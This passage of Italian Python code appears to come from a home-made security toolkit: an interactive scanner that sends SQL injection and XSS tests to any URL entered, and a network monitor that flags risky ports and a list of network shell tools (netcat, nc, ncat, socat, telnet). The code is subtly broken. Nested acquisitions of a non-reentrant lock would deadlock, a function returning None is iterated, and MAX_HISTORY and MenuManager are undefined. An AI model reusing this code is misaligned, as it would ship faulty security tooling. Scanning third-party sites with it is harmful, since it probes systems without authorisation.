        recommendations.update([
            "Implementare Content Security Policy (CSP)",
            "Utilizzare framework moderni che implementano automaticamente protezioni XSS",
            "Validare input in base a whitelist invece che blacklist",
            "Utilizzare funzioni di encoding appropriate al contesto (HTML, JS, URL, etc)",
            "Implementare HttpOnly flag per i cookie sensibili",
            "Mantenere aggiornate le librerie client-side"
        ])
        
        return list(recommendations)

    def scan_website(self, url: str, scan_depth: int = 1) -> Dict:
        """
        Esegue una scansione completa di sicurezza di un sito web
        
        Args:
            url: URL del sito da scansionare
            scan_depth: Profondità della scansione (livelli di link da seguire)
            
        Returns:
            Dict con risultati completi della scansione
        """
        print(f"\nInizio scansione sicurezza per {url}")
        print(f"Profondità scansione: {scan_depth}")
        
        results = {
            'url': url,
            'scan_start': datetime.now().isoformat(),
            'sql_injection': None,
            'xss': None,
            'summary': None
        }
        
        try:
            # Test SQL Injection
            print("\nEsecuzione test SQL Injection...")
            sql_results = self.test_sql_injection(url)
            results['sql_injection'] = sql_results
            
            # Test XSS
            print("\nEsecuzione test XSS...")
            xss_results = self.test_xss(url)
            results['xss'] = xss_results
            
            # Genera sommario
            total_vulnerabilities = (
                len(sql_results['vulnerabilities']) +
                len(xss_results['vulnerabilities'])
            )
            
            results['summary'] = {
                'total_vulnerabilities': total_vulnerabilities,
                'sql_injection_found': len(sql_results['vulnerabilities']),
                'xss_found': len(xss_results['vulnerabilities']),
                'risk_level': self._calculate_risk_level(total_vulnerabilities),
                'scan_duration': str(datetime.now() - datetime.fromisoformat(results['scan_start']))
            }
            
        except Exception as e:
            self._log_error(f"Errore durante la scansione: {str(e)}")
            results['error'] = str(e)
            
        finally:
            results['scan_end'] = datetime.now().isoformat()
            
        return results

    def _calculate_risk_level(self, total_vulnerabilities: int) -> str:
        """Calcola il livello di rischio basato sul numero di vulnerabilità"""
        if total_vulnerabilities == 0:
            return "Basso"
        elif total_vulnerabilities <= 2:
            return "Medio"
        elif total_vulnerabilities <= 5:
            return "Alto"
        else:
            return "Critico"

    def generate_report(self, scan_results: Dict) -> str:
        """
        Genera un report dettagliato dei risultati della scansione
        
        Args:
            scan_results: Risultati della scansione
            
        Returns:
            str: Report formattato
        """
        report = []
        
        # Intestazione
        report.append("=" * 50)
        report.append("REPORT SCANSIONE SICUREZZA WEB")
        report.append("=" * 50)
        report.append(f"\nURL Scansionato: {scan_results['url']}")
        report.append(f"Data Inizio: {scan_results['scan_start']}")
        report.append(f"Data Fine: {scan_results['scan_end']}")
        
        if 'error' in scan_results:
            report.append(f"\nERRORE DURANTE LA SCANSIONE: {scan_results['error']}")
            return "\n".join(report)
        
        # Sommario
        summary = scan_results['summary']
        report.append("\nSOMMARIO:")
        report.append(f"Vulnerabilità Totali: {summary['total_vulnerabilities']}")
        report.append(f"Livello di Rischio: {summary['risk_level']}")
        report.append(f"Durata Scansione: {summary['scan_duration']}")
        
        # Dettagli SQL Injection
        sql_results = scan_results['sql_injection']
        report.append("\nRISULTATI SQL INJECTION:")
        report.append(f"Test Eseguiti: {sql_results['total_tests']}")
        report.append(f"Vulnerabilità Trovate: {sql_results['vulnerabilities_found']}")
        
        if sql_results['vulnerabilities']:
            report.append("\nDettaglio Vulnerabilità SQL:")
            for vuln in sql_results['vulnerabilities']:
                report.append(f"- Tipo: {vuln['type']}")
                report.append(f"  Payload: {vuln['payload']}")
                report.append(f"  Dettagli: {vuln['details']}")
        
        # Dettagli XSS
        xss_results = scan_results['xss']
        report.append("\nRISULTATI XSS:")
        report.append(f"Test Eseguiti: {xss_results['total_tests']}")
        report.append(f"Vulnerabilità Trovate: {xss_results['vulnerabilities_found']}")
        
        if xss_results['vulnerabilities']:
            report.append("\nDettaglio Vulnerabilità XSS:")
            for vuln in xss_results['vulnerabilities']:
                report.append(f"- Tipo: {vuln['type']}")
                report.append(f"  Payload: {vuln['payload']}")
                report.append(f"  Dettagli: {vuln['details']}")
        
        # Raccomandazioni
        report.append("\nRACCOMANDAZIONI SQL INJECTION:")
        for rec in sql_results['recommendations']:
            report.append(f"- {rec}")
            
        report.append("\nRACCOMANDAZIONI XSS:")
        for rec in xss_results['recommendations']:
            report.append(f"- {rec}")
        
        return "\n".join(report)
    
def web_security_menu():
    """Menu interattivo per i test di sicurezza web"""
    
    tester = WebSecurityTester()
    
    while True:
        print("\n=== Menu Test Sicurezza Web ===")
        print("1. Scansione Completa Sito")
        print("2. Test SQL Injection")
        print("3. Test XSS")
        print("4. Genera Report Ultimo Test")
        print("5. Configurazione Test")
        print("0. Torna al Menu Principale")
        print("============================")
        
        choice = input("\nScegli un'opzione: ").strip()
        
        if choice == "1":
            try:
                url = input("\nInserisci l'URL del sito da scansionare: ").strip()
                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url
                    
                depth = input("Inserisci profondità scansione (default: 1): ").strip()
                depth = int(depth) if depth.isdigit() else 1
                
                print("\nAvvio scansione completa...")
                results = tester.scan_website(url, depth)
                
                # Salva risultati su file
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                filename = f"scan_report_{timestamp}.txt"
                
                with open(filename, 'w') as f:
                    f.write(tester.generate_report(results))
                    
                print(f"\nScan completato. Report salvato in: {filename}")
                
                # Mostra sommario
                print("\nSommario Scansione:")
                print(f"Vulnerabilità trovate: {results['summary']['total_vulnerabilities']}")
                print(f"Livello di rischio: {results['summary']['risk_level']}")
                print(f"Durata: {results['summary']['scan_duration']}")
                
            except Exception as e:
                print(f"\nErrore durante la scansione: {str(e)}")
                
        elif choice == "2":
            try:
                url = input("\nInserisci l'URL da testare per SQL Injection: ").strip()
                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url
                    
                print("\nSeleziona metodo HTTP:")
                print("1. GET")
                print("2. POST")
                method = input("Scelta (default: GET): ").strip()
                method = "POST" if method == "2" else "GET"
                
                print("\nVuoi aggiungere payload personalizzati? (s/N): ")
                if input().lower().startswith('s'):
                    print("Inserisci i payload uno per riga (riga vuota per terminare):")
                    custom_payloads = []
                    while True:
                        payload = input().strip()
                        if not payload:
                            break
                        custom_payloads.append(payload)
                else:
                    custom_payloads = None
                
                print("\nAvvio test SQL Injection...")
                results = tester.test_sql_injection(
                    url=url,
                    method=method,
                    custom_payloads=custom_payloads
                )
                
                print(f"\nTest completati: {results['total_tests']}")
                print(f"Vulnerabilità trovate: {results['vulnerabilities_found']}")
                
                if results['vulnerabilities']:
                    print("\nDettaglio vulnerabilità trovate:")
                    for vuln in results['vulnerabilities']:
                        print(f"\nTipo: {vuln['type']}")
                        print(f"Payload: {vuln['payload']}")
                        print(f"Dettagli: {vuln['details']}")
                
                if results['recommendations']:
                    print("\nRaccomandazioni:")
                    for rec in results['recommendations']:
                        print(f"- {rec}")
                        
            except Exception as e:
                print(f"\nErrore durante il test: {str(e)}")
                
        elif choice == "3":
            try:
                url = input("\nInserisci l'URL da testare per XSS: ").strip()
                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url
                    
                print("\nSeleziona metodo HTTP:")
                print("1. GET")
                print("2. POST")
                method = input("Scelta (default: GET): ").strip()
                method = "POST" if method == "2" else "GET"
                
                print("\nVuoi aggiungere payload personalizzati? (s/N): ")
                if input().lower().startswith('s'):
                    print("Inserisci i payload uno per riga (riga vuota per terminare):")
                    custom_payloads = []
                    while True:
                        payload = input().strip()
                        if not payload:
                            break
                        custom_payloads.append(payload)
                else:
                    custom_payloads = None
                
                print("\nAvvio test XSS...")
                results = tester.test_xss(
                    url=url,
                    method=method,
                    custom_payloads=custom_payloads
                )
                
                print(f"\nTest completati: {results['total_tests']}")
                print(f"Vulnerabilità trovate: {results['vulnerabilities_found']}")
                
                if results['vulnerabilities']:
                    print("\nDettaglio vulnerabilità trovate:")
                    for vuln in results['vulnerabilities']:
                        print(f"\nTipo: {vuln['type']}")
                        print(f"Payload: {vuln['payload']}")
                        print(f"Dettagli: {vuln['details']}")
                
                if results['recommendations']:
                    print("\nRaccomandazioni:")
                    for rec in results['recommendations']:
                        print(f"- {rec}")
                        
            except Exception as e:
                print(f"\nErrore durante il test: {str(e)}")
                
        elif choice == "4":
            files = [f for f in os.listdir('.') if f.startswith('scan_report_')]
            
            if not files:
                print("\nNessun report trovato!")
                continue
                
            print("\nReport disponibili:")
            for i, f in enumerate(files, 1):
                print(f"{i}. {f}")
                
            try:
                selection = int(input("\nSeleziona il numero del report da visualizzare: "))
                if 1 <= selection <= len(files):
                    filename = files[selection-1]
                    with open(filename, 'r') as f:
                        print("\n" + f.read())
                else:
                    print("\nSelezione non valida!")
            except ValueError:
                print("\nSelezione non valida!")
                
        elif choice == "5":
            print("\n=== Configurazione Test ===")
            print("1. Timeout richieste:", tester.timeout)
            print("2. Max redirects:", tester.max_redirects)
            print("3. Verifica SSL:", tester.verify_ssl)
            
            try:
                option = input("\nSeleziona parametro da modificare (0 per tornare): ").strip()
                
                if option == "1":
                    timeout = input("Nuovo timeout (secondi): ").strip()
                    if timeout.isdigit():
                        tester.timeout = int(timeout)
                        print("Timeout aggiornato!")
                        
                elif option == "2":
                    redirects = input("Nuovo max redirects: ").strip()
                    if redirects.isdigit():
                        tester.max_redirects = int(redirects)
                        print("Max redirects aggiornato!")
                        
                elif option == "3":
                    verify = input("Verifica SSL (s/n): ").strip().lower()
                    tester.verify_ssl = verify.startswith('s')
                    print("Verifica SSL aggiornata!")
                    
            except ValueError:
                print("\nValore non valido!")
                
        elif choice == "0":
            break
        else:
            print("\nOpzione non valida!")


if __name__ == "__main__":
    try:
        MenuManager()
    except KeyboardInterrupt:
        print("\nOperazione interrotta dall'utente.")
    except Exception as e:
        print(f"\nErrore: {str(e)}")




































class SafeRequestHandler:
    """Gestisce richieste HTTP con meccanismo di retry"""
    
    def __init__(self, max_retries=3, timeout=10):
        self.max_retries = max_retries
        self.timeout = timeout

    def get(self, url):
        """Esegue una richiesta HTTP con retry"""
        for attempt in range(self.max_retries):
            try:
                response = requests.get(url, timeout=self.timeout)
                response.raise_for_status()
                return response
            except requests.RequestException as e:
                if attempt < self.max_retries - 1:
                    time.sleep(2 ** attempt)  # Retry con backoff esponenziale
                else:
                    raise e

class NetworkMonitor(BaseModule):
    MAX_RETRIES = 3  # Numero massimo di tentativi per richieste di rete
    TIMEOUT = 10  # Timeout per richieste di rete (in secondi)
    CLEANUP_INTERVAL = 300  # Pulizia memoria ogni 5 minuti (300 secondi)
    """
    Modulo avanzato per il monitoraggio del traffico di rete in tempo reale
    con rilevamento di attività sospette e analisi dettagliata
    """
    
    def __init__(self):
        super().__init__()
        self.last_cleanup = time.time()
        self.running = False
        self.alert_queue = queue.Queue()
        self.connection_history = defaultdict(list)
        self.traffic_stats = defaultdict(list)
        self.baseline = None
        self.lock = threading.Lock()
        self.logger = logging.getLogger(__name__)
        self.safe_request_handler = SafeRequestHandler(max_retries=self.MAX_RETRIES, timeout=self.TIMEOUT)
        self.traffic_data = defaultdict(list)  # Inizializza con una struttura dati adeguata
        self.process_cache = {}  # Dizionario per la cache dei processi
        self.running_event = threading.Event()  # Nuovo flag per gestione sicura dei thread

        # Dizionario esteso di porte e servizi da monitorare
        self.ports_info = {
            # Porte Standard
            20: {'service': 'FTP-DATA', 'risk': 'medium', 'description': 'File Transfer Protocol (Data)'},
            21: {'service': 'FTP', 'risk': 'medium', 'description': 'File Transfer Protocol (Control)'},
            22: {'service': 'SSH', 'risk': 'medium', 'description': 'Secure Shell'},
            23: {'service': 'TELNET', 'risk': 'high', 'description': 'Telnet (non sicuro)'},
            25: {'service': 'SMTP', 'risk': 'medium', 'description': 'Simple Mail Transfer Protocol'},
            53: {'service': 'DNS', 'risk': 'low', 'description': 'Domain Name System'},
            80: {'service': 'HTTP', 'risk': 'medium', 'description': 'HyperText Transfer Protocol'},
            110: {'service': 'POP3', 'risk': 'medium', 'description': 'Post Office Protocol v3'},
            123: {'service': 'NTP', 'risk': 'low', 'description': 'Network Time Protocol'},
            143: {'service': 'IMAP', 'risk': 'medium', 'description': 'Internet Message Access Protocol'},
            443: {'service': 'HTTPS', 'risk': 'low', 'description': 'HTTP Secure'},
            445: {'service': 'SMB', 'risk': 'high', 'description': 'Server Message Block'},
            3389: {'service': 'RDP', 'risk': 'high', 'description': 'Remote Desktop Protocol'},
            
            # Porte Database
            1433: {'service': 'MSSQL', 'risk': 'high', 'description': 'Microsoft SQL Server'},
            1521: {'service': 'Oracle', 'risk': 'high', 'description': 'Oracle Database'},
            3306: {'service': 'MySQL', 'risk': 'high', 'description': 'MySQL Database'},
            5432: {'service': 'PostgreSQL', 'risk': 'high', 'description': 'PostgreSQL Database'},
            27017: {'service': 'MongoDB', 'risk': 'high', 'description': 'MongoDB'},
            
            # Porte potenzialmente pericolose
            31337: {'service': 'Back Orifice', 'risk': 'critical', 'description': 'Trojan Back Orifice'},
            4444: {'service': 'Metasploit', 'risk': 'critical', 'description': 'Common Metasploit payload port'},
            5554: {'service': 'Sasser', 'risk': 'critical', 'description': 'Sasser Worm'},
            9996: {'service': 'Backdoor', 'risk': 'critical', 'description': 'Common backdoor port'},
            
            # Porte applicazioni comuni
            5938: {'service': 'TeamViewer', 'risk': 'medium', 'description': 'TeamViewer Remote Access'},
            5900: {'service': 'VNC', 'risk': 'high', 'description': 'Virtual Network Computing'},
            8080: {'service': 'HTTP-ALT', 'risk': 'medium', 'description': 'Alternative HTTP Port'},
            6660: {'service': 'IRC', 'risk': 'medium', 'description': 'Internet Relay Chat'}
        }
    
    def get_latest_event(self):
        """Restituisce l'ultimo evento registrato dal monitor di rete"""
        if not self.alert_queue.empty():
            return self.alert_queue.get()
        return None

    def _cleanup_memory(self):
        """Gestione ottimizzata della memoria"""
        try:
            # Pulisci code con lock per thread safety
            with self.lock:
                # Mantieni solo ultimi 60 minuti di dati
                MAX_HISTORY = 3600  # 1 ora in secondi
            
                # Pulisci statistiche traffico
                if len(self.traffic_stats['bytes_sent']) > MAX_HISTORY:
                    self.traffic_stats['bytes_sent'] = self.traffic_stats['bytes_sent'][-MAX_HISTORY:]
                    self.traffic_stats['bytes_recv'] = self.traffic_stats['bytes_recv'][-MAX_HISTORY:]
            
                # Pulisci storico connessioni
                if len(self.connection_history['active']) > MAX_HISTORY:
                    self.connection_history['active'] = self.connection_history['active'][-MAX_HISTORY:]
                if len(self.connection_history['new_connections']) > MAX_HISTORY:
                    self.connection_history['new_connections'] = self.connection_history['new_connections'][-MAX_HISTORY:]

                # Limita dimensione coda alert
                with self.lock:
                    while not self.alert_queue.empty():
                        try:
                            self.alert_queue.get_nowait()
                        except queue.Empty:
                            break
     
                 
            # Reset cache processi
            self._cleanup_process_cache()        
            self.logger.info("Pulizia memoria completata")
        
        except Exception as e:
            self.logger.error(f"Errore durante pulizia memoria: {str(e)}")

    def _cleanup_queues(self) -> None:
        """Pulisce le code dei dati storici per evitare memory leaks"""
        with self.lock:
            # Pulisci statistiche traffico
            while len(self.traffic_stats['bytes_sent']) > self.MAX_HISTORY:
                self.traffic_stats['bytes_sent'].pop(0)
                self.traffic_stats['bytes_recv'].pop(0)
            
            # Pulisci storico connessioni
            while len(self.connection_history['new_connections']) > self.MAX_HISTORY:
                self.connection_history['new_connections'].pop(0)
            while len(self.connection_history['active']) > self.MAX_HISTORY:
                self.connection_history['active'].pop(0)

            # Pulisci coda alert se troppo grande
            with self.lock:
                while not self.alert_queue.empty():
                    try:
                        self.alert_queue.get_nowait()
                    except queue.Empty:
                        break

    
    def _get_process_details(self, pid: int) -> Dict[str, Union[str, float]]:
        """
        Ottiene informazioni dettagliate su un processo con caching manuale.

        Args:
            pid: Process ID da analizzare
        
        Returns:
            Dict con dettagli del processo
        """
        current_time = time.time()

        # Controlla se il processo è già in cache e se il dato è recente (<60s)
        if pid in self.process_cache:
            cached_data = self.process_cache[pid]
            if current_time - cached_data["_cache_timestamp"] < 60:
                return cached_data

        # Se il dato non è in cache o è scaduto, ricalcola i dettagli
        try:
            process = psutil.Process(pid)
            with self.lock:
                details = {
                    'name': process.name(),
                    'username': process.username(),
                    'status': process.status(),
                    'cpu_percent': process.cpu_percent(),
                    'memory_percent': process.memory_percent(),
                    'create_time': datetime.fromtimestamp(process.create_time()).strftime('%Y-%m-%d %H:%M:%S'),
                    'cmdline': ' '.join(process.cmdline()),
                    'connections': len(process.net_connections()),
                    'threads': process.num_threads(),
                    'open_files': len(process.open_files()),
                    '_cache_timestamp': current_time  # Timestamp per invalidazione cache
                }
                # Memorizza il risultato nella cache
                self.process_cache[pid] = details
                return details
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            return {
                'name': 'Unknown',
                'username': 'N/A',
                'status': 'N/A',
                'cpu_percent': 0.0,
                'memory_percent': 0.0,
                'create_time': 'N/A',
                'cmdline': 'N/A',
                'connections': 0,
                'threads': 0,
                'open_files': 0,
                '_cache_timestamp': current_time
            }

    def _invalidate_process_cache(self):
        """Invalida la cache dei dettagli dei processi"""
        with self.lock:
            self.process_cache.clear()

    def _cleanup_process_cache(self):
        """Pulisce la cache dei processi più vecchi di 60 secondi"""
        with self.lock:
            self.process_cache.clear()



    def _calculate_baseline(self, duration: int = 60) -> None:
        """
        Calcola il baseline del traffico di rete normale
        
        Args:
            duration: Durata in secondi del periodo di calibrazione
        """
        print_colored("Calibrazione del monitoraggio di rete...", Colors.INFO)
        samples = []
        start_time = time.time()
        
        while time.time() - start_time < duration:
            try:
                stats = psutil.net_io_counters()
                samples.append({
                    'bytes_sent': stats.bytes_sent,
                    'bytes_recv': stats.bytes_recv,
                    'packets_sent': stats.packets_sent,
                    'packets_recv': stats.packets_recv
                })
                time.sleep(1)
                
                # Mostra progresso
                progress = ((time.time() - start_time) / duration) * 100
                print(f"Progresso calibrazione: {progress:.1f}%")
                
            except Exception as e:
                self._log_error(f"Errore durante la calibrazione: {str(e)}")
                continue
        
        print("\nCalibrazione completata")
        
        # Calcola statistiche baseline
        with self.lock:
            self.baseline = {
                'bytes_sent_mean': statistics.mean(s['bytes_sent'] for s in samples),
                'bytes_recv_mean': statistics.mean(s['bytes_recv'] for s in samples),
                'bytes_sent_stdev': statistics.stdev(s['bytes_sent'] for s in samples),
                'bytes_recv_stdev': statistics.stdev(s['bytes_recv'] for s in samples),
                'packets_sent_mean': statistics.mean(s['packets_sent'] for s in samples),
                'packets_recv_mean': statistics.mean(s['packets_recv'] for s in samples)
            }

    def _monitor_connections(self) -> None:
        """Thread dedicato al monitoraggio delle connessioni attive"""
        last_connections = set()

        while self.running_event.is_set():
            try:
                current_connections = set()

                try:
                    connections = psutil.net_connections(kind='inet')
                except psutil.AccessDenied:
                    self._log_warning("Accesso negato a psutil.net_connections. Alcune funzionalità potrebbero non essere disponibili.")
                    connections = []  # Fallback per evitare crash
                except Exception as e:
                    self._log_error(f"Errore in net_connections: {str(e)}")
                    time.sleep(5)
                    continue  # Riprova al prossimo ciclo

                with self.lock:  # Protezione del blocco critico
                    for conn in connections:
                        if conn.status == 'ESTABLISHED':
                            # Crea una tupla con le informazioni essenziali
                            conn_info = (
                                conn.laddr.ip, conn.laddr.port,
                                conn.raddr.ip if conn.raddr else None,
                                conn.raddr.port if conn.raddr else None,
                                conn.pid if conn.pid else None
                            )
                            current_connections.add(conn_info)

                            # Analizza la connessione
                            self._analyze_connection(conn)

                    # Trova nuove connessioni
                    new_connections = current_connections - last_connections

                    # Protezione con lock per aggiornare la cronologia connessioni
                    self.connection_history['active'].append(len(current_connections))
                    if len(self.connection_history['active']) > 3600:  # Mantieni 1 ora di storia
                        self.connection_history['active'].pop(0)

                # Analizza solo le nuove connessioni rilevate
                for conn in new_connections:
                    self._analyze_new_connection(conn)

                last_connections = current_connections
                time.sleep(1)

            except Exception as e:
                self._log_error(f"Errore nel monitoraggio connessioni: {str(e)}")
                time.sleep(5)


    def _analyze_connection(self, conn: psutil._common.sconn) -> None:
        """
        Analizza una singola connessione per rilevare attività sospette
        
        Args:
            conn: Oggetto connessione da psutil
        """
        try:
            # Controllo porte sospette
            local_port = conn.laddr.port
            remote_port = conn.raddr.port if conn.raddr else None
            
            for port in [local_port, remote_port]:
                if port and port in self.ports_info:
                    port_info = self.ports_info[port]
                    if port_info['risk'] in ['high', 'critical']:
                        self.alert_queue.put({
                            'type': 'suspicious_port',
                            'severity': port_info['risk'],
                            'message': f"Connessione rilevata su porta {port} "
                                     f"({port_info['service']}: {port_info['description']})",
                            'details': {
                                'local_addr': f"{conn.laddr.ip}:{conn.laddr.port}",
                                'remote_addr': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A",
                                'status': conn.status,
                                'process': self._get_process_details(conn.pid) if conn.pid else None
                            }
                        })
            
            # Controllo processi sospetti
            if conn.pid:
                process = psutil.Process(conn.pid)
                if any(suspicious in process.name().lower() 
                      for suspicious in ['netcat', 'nc', 'ncat', 'socat', 'telnet']):
                    self.alert_queue.put({
                        'type': 'suspicious_process',
                        'severity': 'high',
                        'message': f"Processo sospetto rilevato: {process.name()}",
                        'details': self._get_process_details(conn.pid)
                    })
                    
        except Exception as e:
            self._log_error(f"Errore nell'analisi della connessione: {str(e)}")

    def _analyze_new_connection(self, conn: Tuple) -> None:
        """
        Analizza una nuova connessione rilevata
        
        Args:
            conn: Tupla con informazioni sulla connessione
        """
        try:
            # Estrai informazioni dalla tupla di connessione
            local_ip, local_port, remote_ip, remote_port, pid = conn
            
            # Prepara il messaggio di base
            connection_info = {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'local_address': f"{local_ip}:{local_port}",
                'remote_address': f"{remote_ip}:{remote_port}" if remote_ip else "N/A",
                'process': None
            }
            
            # Aggiungi informazioni sul processo se disponibili
            if pid:
                connection_info['process'] = self._get_process_details(pid)
            
            # Controlla se la connessione è verso/da una porta nota
            if local_port in self.ports_info or (remote_port and remote_port in self.ports_info):
                port_to_check = local_port if local_port in self.ports_info else remote_port
                port_info = self.ports_info[port_to_check]
                
                connection_info['service'] = port_info['service']
                connection_info['risk_level'] = port_info['risk']
                connection_info['description'] = port_info['description']
                
                # Alert per porte ad alto rischio
                if port_info['risk'] in ['high', 'critical']:
                    self.alert_queue.put({
                        'type': 'new_high_risk_connection',
                        'severity': port_info['risk'],
                        'message': f"Nuova connessione su porta ad alto rischio {port_to_check}",
                        'details': connection_info
                    })
            
                # Protezione con lock
                with self.lock:
                    self.connection_history['new_connections'].append(connection_info)
                    if len(self.connection_history['new_connections']) > 3600:
                        self.connection_history['new_connections'].pop(0)
            
        except Exception as e:
            self._log_error(f"Errore nell'analisi della nuova connessione: {str(e)}")

    def _monitor_traffic(self) -> None:
        """Thread dedicato al monitoraggio del traffico di rete"""
        last_bytes_sent = 0
        last_bytes_recv = 0
        last_check = time.time()
        MAX_RETRIES = 3
        INITIAL_RETRY_DELAY = 1

        while self.running_event.is_set():
            success = False
            retry_count = 0
        
            try:
                current_time = time.time()
            
                # Esegui pulizia periodica
                if current_time - self.last_cleanup >= NetworkMonitor.CLEANUP_INTERVAL:
                    self._cleanup_queues()
                    self.last_cleanup = current_time
            
                while not success and retry_count < MAX_RETRIES and self.running:
                    try:
                        stats = psutil.net_io_counters()
                        time_delta = time.time() - last_check
                    
                        # Calcola velocità
                        bytes_sent_sec = (stats.bytes_sent - last_bytes_sent) / time_delta
                        bytes_recv_sec = (stats.bytes_recv - last_bytes_recv) / time_delta
                    
                        current_stats = {
                            'bytes_sent': bytes_sent_sec,
                            'bytes_recv': bytes_recv_sec,
                            'packets_sent': stats.packets_sent,
                            'packets_recv': stats.packets_recv,
                            'timestamp': datetime.now()
                        }
                    
                        # Aggiorna statistiche con lock
                        with self.lock:
                            self.traffic_stats['bytes_sent'].append(bytes_sent_sec)
                            self.traffic_stats['bytes_recv'].append(bytes_recv_sec)
                    
                        # Analizza pattern e gestisci anomalie
                        anomalies = self._analyze_traffic_patterns(current_stats)
                        for anomaly in anomalies:
                            self.alert_queue.put(anomaly)
                    
                        # Aggiorna valori precedenti
                        last_bytes_sent = stats.bytes_sent
                        last_bytes_recv = stats.bytes_recv
                        last_check = time.time()
                    
                        success = True
                    
                    except Exception as e:
                        retry_count += 1
                        self._log_error(f"Errore nel monitoraggio traffico (tentativo {retry_count}/{MAX_RETRIES}): {str(e)}")
                    
                        if retry_count < MAX_RETRIES:
                            retry_delay = INITIAL_RETRY_DELAY * (2 ** (retry_count - 1))
                            self._log_info(f"Nuovo tentativo tra {retry_delay} secondi...")
                            time.sleep(retry_delay)
                        else:
                            self._log_error("Numero massimo di tentativi raggiunto")
                            time.sleep(5)
            
                if success:
                    time.sleep(1)
                
            except (MemoryError, KeyboardInterrupt, SystemExit) as critical_error:
                self._log_error(f"Errore critico nel monitoraggio connessioni: {str(critical_error)}")
                self.running = False  # Ferma il monitoraggio
                raise  # Rilancia l'errore critico per terminare il programma

            except Exception as e:
                self._log_error(f"Errore nel monitoraggio connessioni: {str(e)}")
                time.sleep(5)

    
    def _analyze_traffic_patterns(self, current_stats):
        """
        Analizza i pattern di traffico per individuare anomalie.
        """
        if not self.traffic_data:
            return

        # Esempio di analisi: rilevare scansioni di porte o flooding
        source_ips = {}
        for packet in self.traffic_data:
            src_ip = packet.get('src_ip', 'unknown')
            source_ips[src_ip] = source_ips.get(src_ip, 0) + 1

        for ip, count in source_ips.items():
            if count > 100:  # Soglia per potenziale attacco
                self._log_warning(f"Attività sospetta rilevata da {ip}: {count} pacchetti")

        # Pulisce i dati dopo l'analisi
        self.traffic_data.clear()

    def _format_bytes(self, bytes_value: float) -> str:
        """
        Formatta i bytes in formato leggibile
        
        Args:
            bytes_value: Valore in bytes da formattare
            
        Returns:
            Stringa formattata con unità appropriate
        """
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes_value < 1024:
                return f"{bytes_value:.2f} {unit}"
            bytes_value /= 1024
        return f"{bytes_value:.2f} TB"

    def start_monitoring(self) -> None:
        if not self.running:
            print_colored("Calibrazione del monitoraggio di rete...", Colors.INFO)
        
            # Calcola il baseline prima di avviare il monitoraggio
            self._calculate_baseline()
        
            print_colored("Avvio monitoraggio rete...", Colors.INFO)
            self.running_event.set()

            # Avvia thread monitoraggio
            self.traffic_thread = threading.Thread(target=self._monitor_traffic)
            self.connections_thread = threading.Thread(target=self._monitor_connections)

            # Nuovi thread per pulizia memoria e cache
            self.memory_cleanup_thread = threading.Thread(target=self._memory_cleanup_worker)
            self.cache_cleanup_thread = threading.Thread(target=self._cache_cleanup_worker)

            self.traffic_thread.daemon = True
            self.connections_thread.daemon = True
            self.memory_cleanup_thread.daemon = True
            self.cache_cleanup_thread.daemon = True

            self.traffic_thread.start()
            self.connections_thread.start()
            self.memory_cleanup_thread.start()
            self.cache_cleanup_thread.start()

            self._log_info("Monitoraggio rete avviato con successo")


    def _memory_cleanup_worker(self):
        """Worker thread per pulizia periodica memoria"""
        while self.running_event.is_set():
            try:
                self._cleanup_memory()
                time.sleep(300)  # Esegui ogni 5 minuti
            except Exception as e:
                self._log_error(f"Errore worker pulizia memoria: {str(e)}")
                time.sleep(5)

    def _cache_cleanup_worker(self):
        """Worker thread per la pulizia periodica della cache"""
        while self.running_event.is_set():
            try:
                self._cleanup_process_cache()  
                time.sleep(30)  # Esegui pulizia ogni 30 secondi
            except Exception as e:
                self._log_error(f"Errore nella pulizia cache: {str(e)}")
                time.sleep(5)

    def stop_monitoring(self) -> None:
        """Ferma il monitoraggio della rete in modo sicuro"""
        if self.running:
            print_colored("Arresto monitoraggio rete...", Colors.WARNING)
            self.running_event.clear()

            
            # Attendi massimo 5 secondi per ogni thread
            if hasattr(self, 'traffic_thread') and self.traffic_thread.is_alive():
                self.traffic_thread.join(timeout=5)
            
            if hasattr(self, 'connections_thread') and self.connections_thread.is_alive():
                self.connections_thread.join(timeout=5)
            
            if hasattr(self, 'memory_cleanup_thread') and self.memory_cleanup_thread.is_alive():
                self.memory_cleanup_thread.join(timeout=5)

            if hasattr(self, 'cache_cleanup_thread') and self.cache_cleanup_thread.is_alive():
                self.cache_cleanup_thread.join(timeout=5)

            self._log_info("Monitoraggio rete terminato")

    def get_current_stats(self) -> Dict[str, Union[str, float, List[Dict[str, any]]]]:
        """
        Ottiene le statistiche correnti del monitoraggio
        
        Returns:
            Dict con statistiche correnti, connessioni attive e alert
        """
        stats = psutil.net_io_counters()
        active_connections = len([c for c in psutil.net_connections() if c.status == 'ESTABLISHED'])
        
        with self.lock:
            # Calcola medie degli ultimi 60 secondi
            recent_bytes_sent = self.traffic_stats['bytes_sent'][-60:] if self.traffic_stats['bytes_sent'] else [0]
            recent_bytes_recv = self.traffic_stats['bytes_recv'][-60:] if self.traffic_stats['bytes_recv'] else [0]
            
            current_stats = {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'bytes_sent_per_sec': statistics.mean(recent_bytes_sent),
                'bytes_recv_per_sec': statistics.mean(recent_bytes_recv),
                'total_bytes_sent': stats.bytes_sent,
                'total_bytes_recv': stats.bytes_recv,
                'total_packets_sent': stats.packets_sent,
                'total_packets_recv': stats.packets_recv,
                'active_connections': active_connections,
                'connections_history': self.connection_history,
                'baseline': self.baseline
            }
            
            # Formatta i valori di bytes
            current_stats['bytes_sent_formatted'] = self._format_bytes(current_stats['bytes_sent_per_sec'])
            current_stats['bytes_recv_formatted'] = self._format_bytes(current_stats['bytes_recv_per_sec'])
            current_stats['total_bytes_sent_formatted'] = self._format_bytes(current_stats['total_bytes_sent'])
            current_stats['total_bytes_recv_formatted'] = self._format_bytes(current_stats['total_bytes_recv'])
            
            return current_stats

    def print_stats(self, detailed: bool = False) -> None:
        """
        Stampa le statistiche correnti
        
        Args:
            detailed: Se True, stampa statistiche dettagliate
        """
        stats = self.get_current_stats()
        
        print_colored("\nStatistiche Rete", Colors.HEADER)
        print(f"Timestamp: {stats['timestamp']}")
